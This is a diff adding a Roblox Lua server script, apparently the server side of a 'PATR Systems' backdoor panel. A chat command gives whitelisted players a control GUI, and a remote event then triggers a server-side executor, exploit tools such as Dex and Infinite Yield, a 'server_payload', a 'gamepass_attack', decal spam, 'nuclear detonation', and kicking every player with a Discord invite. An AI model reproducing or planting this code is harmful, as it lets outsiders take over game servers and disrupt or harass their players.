@@ -1,1 +1,102 @@
+--[[
+    ____  ___  __________     _____            __                     
+   / __ \/   |/_  __/ __ \   / ___/__  _______/ /____  ____ ___  _____
+  / /_/ / /| | / / / /_/ /   \__ \/ / / / ___/ __/ _ \/ __ `__ \/ ___/
+ / ____/ ___ |/ / / _, _/   ___/ / /_/ (__  ) /_/  __/ / / / / (__  ) 
+/_/   /_/  |_/_/ /_/ |_|   /____/\__, /____/\__/\___/_/ /_/ /_/____/  
+                                /____/                                
 
+	Module: server.lua
+	Version: 1
+	Scripted by: AccelRanger
+]]
+
+local remoteEvent
+local remoteFunction
+local sound
+
+local MainModule = script.MainModule.Value
+local src = MainModule.lib.src
+local basicWhitelist = require(MainModule.BasicWhitelist)
+
+print("booted")
+
+game.Players.PlayerAdded:Connect(function(Player)
+	Player.Chatted:Connect(function(msg)
+		if msg == "/e init" then
+			if basicWhitelist(Player) then
+				local gui = MainModule.gui.core_gui:Clone()
+				gui.Parent = Player.PlayerGui
+				gui.Name = require(MainModule.lib.mod.GUID).getGUID()
+			end
+		end
+	end)
+end)
+
+for _,v in pairs(game.Teams:GetDescendants()) do
+	if v:IsA("RemoteEvent") then
+		if v:HasTag("PATR_RE") then
+			RemoteEvent = v
+		end
+	end
+	if v:IsA("RemoteFunction") then
+		if v:HasTag("PATR_RF") then
+			RemoteFunction = v
+		end
+	end
+end
+
+for _,v in pairs(game.SoundService:GetDescendants()) do
+	if v:IsA("Sound") then	
+		if v:HasTag("PATR_SD") then
+			sound = v
+		end
+	end
+end
+
+RemoteEvent.OnServerEvent:Connect(function(Player, Action, Arg, Heading, Subheading)
+	if Action == "ss_executor" then
+		require(src.ss_exec)(Player)
+	elseif Action == "dex" then
+		require(src.DexV5)(Player)
+	elseif Action == "nuclear_d" then
+		require(src.NuclearDetonation)(Player)
+	elseif Action == "inf_yield" then
+		require(src.InfYield)(Player)
+	elseif Action == "plr_tools" then
+		require(src.PlayerTools)(Player)
+	elseif Action == "decal_spam" then
+		require(src.decalSpam)()
+	elseif Action == "sponsor" then
+		require(src.Sponsor)()
+	elseif Action == "annouce" then
+		require(src.Annouce)(Heading, Subheading)
+	elseif Action == "server_payload" then
+		require(src.serverPayload)()
+	elseif Action == "gamepass_attack" then
+		require(src.gamepassAttack)()
+	elseif Action == "kick_all" then
+		for _,v in pairs(game.Players:GetChildren()) do
+			if v:IsA("Player") then
+				v:Kick("PATR | Kick all function. | gg/b3EktpfEQn")
+			end
+		end
+	elseif Action == "kick" then
+		game.Players:FindFirstChild(Arg):Kick("PATR | Kick function | gg/b3EktpfEQn")
+	elseif Action == "r6" then
+		require(src.changeCharType)(Player, "r6")
+	elseif Action == "r15" then
+		require(src.changeCharType)(Player, "r15")
+	elseif Action == "globalAudio" then
+		sound.SoundId = Arg
+		sound:Play()
+	elseif Action == "globalAudio_STOP" then
+		sound:Stop()
+	elseif Action == "antiLeave" then
+		if Arg == true then
+			RemoteEvent:FireAllClients("antiLeave", true)
+		elseif Arg == false then
+			RemoteEvent:FireAllClients("antiLeave", false)
+		end
+	end
+end)
